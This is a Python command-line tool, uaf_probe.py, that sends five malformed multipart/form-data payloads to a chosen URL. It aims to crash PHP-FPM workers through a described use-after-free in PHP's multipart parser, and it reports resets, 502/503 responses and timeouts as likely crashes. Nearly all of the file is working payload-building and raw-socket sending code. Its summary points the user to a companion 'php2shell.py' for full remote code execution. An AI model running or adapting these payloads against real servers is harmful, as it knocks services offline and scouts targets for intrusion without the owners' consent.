#!/usr/bin/env python3
"""
uaf_probe — CVE-2026-109619 Multipart Parser UAF Crash Probe

Sends malformed multipart/form-data payloads to trigger the heap
use-after-free in PHP's SAPI multipart parser. This vulnerability
exists independently of session.upload_progress and fires on any
endpoint that processes multipart POST requests.

Detection is behavioral: connection resets, HTTP 502/503 responses,
or timeouts indicate that a PHP-FPM worker process has crashed,
which is consistent with a use-after-free triggering a segfault.

This tool does NOT achieve code execution — it probes for the
presence of the vulnerability. Use php2shell.py for the full
RCE chain.

Usage:
  python3 uaf_probe.py -t http://localhost:8080/upload.php
  python3 uaf_probe.py -t http://target/index.php -v --repeat 3
  python3 uaf_probe.py -t http://target/upload.php --variant nested

Author: Security Research Team
License: MIT — For authorized security research and education only.
"""

import argparse
import json
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

__version__ = "1.0.0"

BANNER = r"""
  ┌──────────────────────────────────────────┐
  │  CVE-2026-109619 — UAF Crash Probe       │
  │  PHP Multipart Parser Use-After-Free     │
  │  v{ver}                                    │
  └──────────────────────────────────────────┘
""".format(ver=__version__)


# --- Payload variants ---------------------------------------------------------

VARIANTS = {
    "nested": {
        "desc": "Nested boundaries with double-close — confuses parser buffer ownership during cleanup",
        "build": None,  # set below
    },
    "longheader": {
        "desc": "Oversized Content-Disposition and Content-Type headers — stresses buffer allocation",
        "build": None,
    },
    "nullbyte": {
        "desc": "Null bytes in part body — corrupts length calculations in C string handling",
        "build": None,
    },
    "truncated": {
        "desc": "Missing closing boundary — forces parser to handle unexpected EOF during part read",
        "build": None,
    },
    "interleaved": {
        "desc": "Interleaved boundaries from two different multipart containers — confuses parser state machine",
        "build": None,
    },
}


def build_nested() -> tuple[bytes, str]:
    boundary = "----php2shellNestedBoundary"
    body = (
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
        f"AAAA\r\n"
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    body += b"B" * 4096 + b"\r\n"
    body += f"{boundary}\r\n".encode()
    body += b"Content-Disposition: form-data; name=\"extra\"\r\n\r\nC\r\n"
    # Double-close: forces cleanup routine to run twice on same buffer
    body += f"{boundary}--\r\n{boundary}--\r\n".encode()
    ct = f"multipart/form-data; boundary={boundary[2:]}"
    return body, ct


def build_longheader() -> tuple[bytes, str]:
    boundary = "----php2shellLongHeader"
    body = (
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"{'A' * 8192}\"; "
        f"filename=\"{'B' * 8192}\"\r\n"
        f"Content-Type: {'C' * 4096}\r\n\r\n"
        f"DATA\r\n"
        f"{boundary}--\r\n"
    ).encode()
    ct = f"multipart/form-data; boundary={boundary[2:]}"
    return body, ct


def build_nullbyte() -> tuple[bytes, str]:
    boundary = "----php2shellNullByte"
    body = f"{boundary}\r\n".encode()
    body += b"Content-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n"
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += b"\x00" * 512 + b"\r\n"
    body += f"{boundary}--\r\n".encode()
    ct = f"multipart/form-data; boundary={boundary[2:]}"
    return body, ct


def build_truncated() -> tuple[bytes, str]:
    boundary = "----php2shellTruncated"
    body = (
        f"{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"INCOMPLETE_DATA_NO_CLOSING_BOUNDARY"
    ).encode()
    ct = f"multipart/form-data; boundary={boundary[2:]}"
    return body, ct


def build_interleaved() -> tuple[bytes, str]:
    b1 = "----php2shellBoundaryA"
    b2 = "----php2shellBoundaryB"
    body = (
        f"{b1}\r\n"
        f"Content-Disposition: form-data; name=\"a\"\r\n\r\n"
        f"A\r\n"
        f"{b2}\r\n"
        f"Content-Disposition: form-data; name=\"b\"\r\n\r\n"
        f"B\r\n"
        f"{b1}--\r\n"
    ).encode()
    ct = f"multipart/form-data; boundary={b1[2:]}"
    return body, ct


VARIANTS["nested"]["build"] = build_nested
VARIANTS["longheader"]["build"] = build_longheader
VARIANTS["nullbyte"]["build"] = build_nullbyte
VARIANTS["truncated"]["build"] = build_truncated
VARIANTS["interleaved"]["build"] = build_interleaved


# --- Raw HTTP sender ----------------------------------------------------------

def send_raw(host: str, port: int, path: str, body: bytes, content_type: str,
             use_tls: bool = False, timeout: float = 5.0) -> dict:
    """
    Send a raw HTTP POST and classify the response. Uses raw sockets
    to detect crashes (connection reset, broken pipe) that a high-level
    library would mask with retries.
    """
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    result = {"status": None, "error": None, "bytes": 0, "raw": ""}

    try:
        sock.connect((host, port))
        sock.sendall(request)

        response = b""
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            response += chunk

        result["raw"] = response.decode("utf-8", errors="replace")
        result["bytes"] = len(response)

        first_line = result["raw"].split("\r\n")[0] if result["raw"] else ""
        if " " in first_line:
            try:
                result["status"] = int(first_line.split(" ")[1])
            except (ValueError, IndexError):
                pass

    except socket.timeout:
        result["error"] = "TIMEOUT"
    except ConnectionResetError:
        result["error"] = "CONNECTION_RESET"
    except ConnectionRefusedError:
        result["error"] = "CONNECTION_REFUSED"
    except BrokenPipeError:
        result["error"] = "BROKEN_PIPE"
    except OSError as exc:
        result["error"] = f"OS_ERROR: {exc}"
    finally:
        sock.close()

    return result


def classify(result: dict) -> tuple[str, str]:
    """Classify the probe result. Returns (verdict, color_code)."""
    err = result.get("error")
    status = result.get("status")

    if err in ("CONNECTION_RESET", "BROKEN_PIPE"):
        return "CRASH_LIKELY", "\033[91m"
    if err == "TIMEOUT":
        return "HANG_OR_CRASH", "\033[93m"
    if err == "CONNECTION_REFUSED":
        return "REFUSED", "\033[90m"
    if err:
        return f"ERROR ({err})", "\033[90m"
    if status in (502, 503):
        return "WORKER_DEAD", "\033[91m"
    if status == 200:
        return "OK", "\033[92m"
    if status:
        return f"HTTP_{status}", "\033[90m"
    if result["bytes"] == 0:
        return "EMPTY", "\033[93m"
    return "UNKNOWN", "\033[90m"


# --- Probe engine -------------------------------------------------------------

def probe(target_url: str, variants: list[str], repeat: int = 1,
          timeout: float = 5.0, verbose: bool = False) -> dict:
    """Run all selected variants against the target. Returns results dict."""
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    use_tls = parsed.scheme == "https"

    results = {}

    for variant_name in variants:
        variant = VARIANTS[variant_name]
        build_fn = variant["build"]
        body, ct = build_fn()

        run_results = []
        for attempt in range(repeat):
            tag = f"[{variant_name}]"
            if repeat > 1:
                tag = f"[{variant_name} #{attempt+1}]"

            print(f"  {tag:24s} {len(body):>6d} bytes ... ", end="", flush=True)

            res = send_raw(host, port, path, body, ct, use_tls=use_tls, timeout=timeout)
            verdict, color = classify(res)
            run_results.append(verdict)

            RESET = "\033[0m"
            suffix = ""
            if verdict in ("CRASH_LIKELY", "WORKER_DEAD"):
                suffix = "  <-- potential UAF trigger"
            elif verdict == "HANG_OR_CRASH":
                suffix = "  <-- possible crash"

            print(f"{color}{verdict}{RESET}{suffix}")

            if verbose:
                if res["error"]:
                    print(f"{'':26s}error: {res['error']}")
                elif res["raw"]:
                    preview = res["raw"][:300].replace("\n", "\\n")
                    print(f"{'':26s}response: {preview}")

            time.sleep(0.3)

        results[variant_name] = run_results

    return results


def print_summary(results: dict):
    print()
    crash_variants = []
    for name, verdicts in results.items():
        crashes = sum(1 for v in verdicts if v in ("CRASH_LIKELY", "WORKER_DEAD", "HANG_OR_CRASH"))
        if crashes:
            crash_variants.append((name, crashes, len(verdicts)))

    if crash_variants:
        print("\033[91m[!] Potential vulnerability detected:\033[0m")
        for name, crashes, total in crash_variants:
            print(f"    {name}: {crashes}/{total} abnormal responses")
        print()
        print("    Next steps:")
        print("    1. Check PHP-FPM error logs for segfault/signal 11")
        print("    2. Run with --repeat 5 to confirm consistency")
        print("    3. Use php2shell.py for full RCE exploitation")
    else:
        print("[*] No crashes detected.")
        print("    Possible reasons:")
        print("    - Target PHP version is already patched")
        print("    - Different SAPI (mod_php vs php-fpm) may behave differently")
        print("    - Heap layout did not trigger the UAF in this run")
        print("    - Target is behind a WAF filtering malformed requests")


# --- Entry point --------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-109619 — PHP Multipart Parser UAF Crash Probe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s -t http://localhost:8080/upload.php
  %(prog)s -t https://target.com/index.php -v --repeat 3
  %(prog)s -t http://target/upload.php --variant nested longheader
        """,
    )

    p.add_argument("-t", "--target", required=True,
                   help="Full target URL including path (e.g., http://host:8080/upload.php)")
    p.add_argument("--variant", nargs="+", choices=list(VARIANTS.keys()),
                   default=list(VARIANTS.keys()),
                   help="Specific variants to test (default: all)")
    p.add_argument("--repeat", type=int, default=1,
                   help="Repeat each variant N times (default: 1)")
    p.add_argument("--timeout", type=float, default=5.0,
                   help="Socket timeout in seconds (default: 5.0)")
    p.add_argument("--json", action="store_true",
                   help="Output results as JSON")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Show response previews")
    p.add_argument("-q", "--quiet", action="store_true",
                   help="Suppress banner")

    args = p.parse_args()

    if not args.quiet:
        print(BANNER)

    parsed = urlparse(args.target)
    if not parsed.hostname:
        print("Error: Invalid URL. Include scheme and host (http://host:port/path)")
        sys.exit(1)

    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    print(f"[*] Target: {host}:{port}{parsed.path}")
    print(f"[*] Variants: {', '.join(args.variant)}")
    print(f"[*] Repeat: {args.repeat}x")
    print()

    results = probe(args.target, args.variant, repeat=args.repeat,
                    timeout=args.timeout, verbose=args.verbose)

    if args.json:
        print(json.dumps(results, indent=2))
    else:
        print_summary(results)


if __name__ == "__main__":
    main()
